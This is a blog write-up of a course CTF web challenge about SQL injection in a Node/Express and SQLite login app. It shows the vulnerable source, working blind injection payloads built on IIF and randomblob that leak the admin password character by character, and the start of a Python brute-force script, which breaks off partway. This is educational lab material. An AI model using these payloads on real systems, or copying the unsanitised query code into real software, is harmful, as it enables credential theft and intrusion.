<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Web 0x41(2023 HW - Double Injection - FLAG1)
  #


  Background
  #

Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::

  Source code
  #

:::spoiler init-db.js
const fs = require(&#39;fs&#39;);
const sqlite3 = require(&#39;sqlite3&#39;).verbose();

const FLAG1 = fs.readFileSync(&#39;/flag1.txt&#39;, &#39;utf8&#39;).trim();
const db = new sqlite3.Database(&#39;/etc/db.sqlite3&#39;);
db.exec(`
DROP TABLE IF EXISTS users;
CREATE TABLE db (
    users JSON NOT NULL
);
INSERT INTO db(users) VALUES (&#39;{
    "admin": {
        "username": "admin",
        "password": "${FLAG1}"
    },
    "guest": {
        "username": "guest",
        "password": "guest"
    }
}&#39;);
`);
:::
:::spoiler Dockerfile'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x41(2023 HW - Double Injection - FLAG1)"><meta property="og:description" content='Simple Web 0x41(2023 HW - Double Injection - FLAG1) # Background # Time Based SQLi :::info 建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便 :::
Source code # :::spoiler init-db.js
const fs = require(&#39;fs&#39;); const sqlite3 = require(&#39;sqlite3&#39;).verbose(); const FLAG1 = fs.readFileSync(&#39;/flag1.txt&#39;, &#39;utf8&#39;).trim(); const db = new sqlite3.Database(&#39;/etc/db.sqlite3&#39;); db.exec(` DROP TABLE IF EXISTS users; CREATE TABLE db ( users JSON NOT NULL ); INSERT INTO db(users) VALUES (&#39;{ "admin": { "username": "admin", "password": "${FLAG1}" }, "guest": { "username": "guest", "password": "guest" } }&#39;); `); ::: :::spoiler Dockerfile'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---time-based-sqli>Exploit - Time Based SQLi</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x412023-hw---double-injection---flag1>Simple Web 0x41(2023 HW - Double Injection - FLAG1)
<a class=anchor href=#simple-web-0x412023-hw---double-injection---flag1>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler init-db.js</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sqlite3</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;sqlite3&#39;</span>).<span style=color:#a6e22e>verbose</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG1</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;/flag1.txt&#39;</span>, <span style=color:#e6db74>&#39;utf8&#39;</span>).<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>sqlite3</span>.<span style=color:#a6e22e>Database</span>(<span style=color:#e6db74>&#39;/etc/db.sqlite3&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>DROP TABLE IF EXISTS users;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>CREATE TABLE db (
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    users JSON NOT NULL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>INSERT INTO db(users) VALUES (&#39;{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;admin&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;username&#34;: &#34;admin&#34;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;password&#34;: &#34;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    },
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;guest&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;username&#34;: &#34;guest&#34;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;password&#34;: &#34;guest&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}&#39;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>`</span>);
</span></span></code></pre></div><p>:::
:::spoiler Dockerfile</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=display:flex><span><span style=color:#66d9ef>FROM</span><span style=color:#e6db74> node:alpine</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> mkdir -p /usr/src/app<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>WORKDIR</span><span style=color:#e6db74> /usr/src/app</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>COPY</span> ./app .<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> yarn install<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> echo <span style=color:#e6db74>&#39;FLAG{flag-1}&#39;</span> &gt; /flag1.txt<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> echo <span style=color:#e6db74>&#39;FLAG{flag-2}&#39;</span> &gt; <span style=color:#e6db74>&#34;/flag2-</span><span style=color:#66d9ef>$(</span>tr -dc <span style=color:#e6db74>&#39;a-zA-Z0-9&#39;</span> &lt; /dev/urandom | head -c 16<span style=color:#66d9ef>)</span><span style=color:#e6db74>.txt&#34;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> node ./init-db.js <span style=color:#f92672>&amp;&amp;</span> chmod <span style=color:#ae81ff>444</span> /etc/db.sqlite3<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> adduser -D -h /home/ctf ctf<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>RUN</span> chown -R ctf:ctf /usr/src/app<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>USER</span><span style=color:#e6db74> ctf</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#66d9ef>CMD</span> [ <span style=color:#e6db74>&#34;node&#34;</span>, <span style=color:#e6db74>&#34;app.js&#34;</span> ]<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>:::
:::spoiler app.js</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ejs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;ejs&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sqlite3</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;sqlite3&#39;</span>).<span style=color:#a6e22e>verbose</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG1</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;/flag1.txt&#39;</span>, <span style=color:#e6db74>&#39;utf8&#39;</span>).<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>sqlite3</span>.<span style=color:#a6e22e>Database</span>(<span style=color:#e6db74>&#39;/etc/db.sqlite3&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;form action=&#34;/login&#34; method=&#34;POST&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;text&#34; name=&#34;username&#34; placeholder=&#34;Username&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;password&#34; name=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/form&gt;`</span>
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jsonPath</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#e6db74>`$.</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>username</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.password`</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>query</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`SELECT json_extract(users, </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>jsonPath</span><span style=color:#e6db74>}</span><span style=color:#e6db74>) AS password FROM db`</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// console.log(query);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>template</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;html&gt;&lt;head&gt;&lt;title&gt;Success&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;h1&gt;Success!&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;p&gt;Logged in as </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>username</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/body&gt;&lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    `</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>query</span>, (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>row</span>) =&gt; {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>headersSent</span>) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>err</span>) <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Internal Server Error&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// console.log(row);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>row</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>FLAG1</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>`&lt;h1&gt;Success!&lt;/h1&gt;`</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#a6e22e>template</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>            } 
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Unauthorized&#39;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setTimeout</span>(Math.<span style=color:#a6e22e>random</span>() <span style=color:#f92672>*</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>, () =&gt; <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Unauthorized&#39;</span>));
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#ae81ff>3000</span>, () =&gt; <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Listening on port 3000&#39;</span>));
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到<code>/flag1.txt</code>,<code>/flag2-{random string}.txt</code>中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(<code>/etc/db.sqlite3</code>)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js</p><ul><li>目標:
我們的目標是想辦法把FLAG1拿到手，但看了一圈app.js也沒有任何想法，雖然我知道username的地方有SQLinjection的洞，但重要的是如何把密碼送到前端給我們</li><li>一開始的想法:
送出post request後，會進到login route，並且db會對送來的username / password進行query，此時會發現有兩個if statement，當時我在想，只要滿足第一個if statement，他就會return並且render出原本的username，所以如果我可以創一個新的table或是insert原本的users table，並且把username設定成FLAG1，然後password設定已知，這樣的話就一定會進到第二個if statement，如此就算我不知道FLAG1是多少，他也會把username吐回來到前端<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>row</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>FLAG1</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>`&lt;h1&gt;Success!&lt;/h1&gt;`</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#a6e22e>template</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Unauthorized&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>但這個做法有兩個原因導致無法實踐<ol><li>前面講過，splitline把<code>/etc/db.sqlite3</code>設定成read-only，所以我們無法對他做任何修改</li><li>就算這個file可以修改，因為ejs.render的關係，如果給定的1st參數沒有format可以填入(就像第二個if出現的template)，他並不會把username一起render進去，雖然我也不確定為甚麼要這樣寫</li></ol></li><li>比較可行的方式<ol><li>逛了好幾圈app.js都沒有任何可以把username吐回前端的地方，代表這個思路應該不是可行的方式，此時可以想想看time based或是boolean based 這種blind injection，可能是個不錯的方式，雖然我也有嘗試union based，不過效果不大</li><li>因為是完全沒有任何filter的sql injection，所以我就直接在local的sqlite db browser下語法順便debug，當payload如下時:<pre tabindex=0><code class=language-sql! data-lang=sql!>admin.username&#34;) as a,
  json_extract(users, &#39;$.admin.username&#39;) as b,
  json_extract(users, &#39;$.admin.password&#39;) as c
FROM db -- #
</code></pre><ul><li>在server端會變成<pre tabindex=0><code class=language-sql! data-lang=sql!>&#34;$.admin.username\&#34;) as a,   json_extract(users, &#39;$.admin.username&#39;) as b,   json_extract(users, &#39;$.admin.password&#39;) as c FROM db -- # .password&#34;
</code></pre></li><li>完整的query會變成<pre tabindex=0><code class=language-sql! data-lang=sql!>SELECT json_extract(users, &#34;$.admin.username\&#34;) as a,   json_extract(users, &#39;$.admin.username&#39;) as b,   json_extract(users, &#39;$.admin.password&#39;) as c FROM db -- # .password&#34;) AS password FROM db
</code></pre></li><li>則query到的data如下<pre tabindex=0><code class=language-sql! data-lang=sql!>{ a: null, b: &#39;admin&#39;, c: &#39;FLAG{flag-1}&#39; }
</code></pre></li></ul>第一個參數a為null是因為app.js中，我們的payload經過==JSON.stringify==，會在雙引號前加一個反斜線，這會導致query時，db不知道==$.admin.username==是甚麼東西，只有單引號沒有這個問題，但如果第一個query data不加上雙引號就會導致閉合不全而導致結果異常(如下)
<img src=https://hackmd.io/_uploads/Hy29LmYvp.png alt=圖片>
所以我乾脆第一個參數就算了，重新利用後兩個參數要到username和password</li><li>有了這個可以幹嘛呢?我們可以下條件，當條件符合的時候做A，否則做B，而A和B是有一些差異，可能是時間長度或是網站是否crash為基準，這樣的話我們就可以知道下的條件是否正確，POC如下:<ul><li><p>看長度</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> 
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> a,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> db
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>AND</span> IIF(<span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>c</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>, (<span style=color:#66d9ef>SELECT</span> randomblob(<span style=color:#ae81ff>1000000000</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>FROM</span> sqlite_master <span style=color:#66d9ef>WHERE</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>LIMIT</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>); <span style=color:#75715e>-- # 
</span></span></span></code></pre></div><p>在local測試時，FLAG1=<code>FLAG{test}</code>，也就是只有10個字，如果條件設定不符合時，就會query出東西，因為條件不符回傳1，如下圖
<img src=https://hackmd.io/_uploads/SJxwu7Fwa.png alt=圖片></p><hr><p>反之，就會query不出東西，也就是crash
<img src=https://hackmd.io/_uploads/Hywt_QYvp.png alt=圖片></p></li><li><p>如果想要知道某一個字元可以substr這個function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> 
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> a,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> db
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>AND</span> IIF(substr(<span style=color:#66d9ef>c</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;FLAG{&#39;</span>, (<span style=color:#66d9ef>SELECT</span> randomblob(<span style=color:#ae81ff>1000000000</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>FROM</span> sqlite_master <span style=color:#66d9ef>WHERE</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>LIMIT</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>); <span style=color:#75715e>-- # 
</span></span></span></code></pre></div></li></ul></li><li>此時就可以開寫script去server端爆破FLAG1</li></ol></li></ul><h2 id=exploit---time-based-sqli>Exploit - Time Based SQLi
<a class=anchor href=#exploit---time-based-sqli>#</a></h2><pre tabindex=0><code class=language-python! data-lang=python!>from requests import *
from string import *


strings = ascii_letters + digits + punctuation
url = &#34;http://10.113.184.121:10081/login&#34;

flag = &#34;&#34;
for i in range(27):
    if i == 26:
        flag += &#34;}&#34;
        break
    else:
        for string in strings:
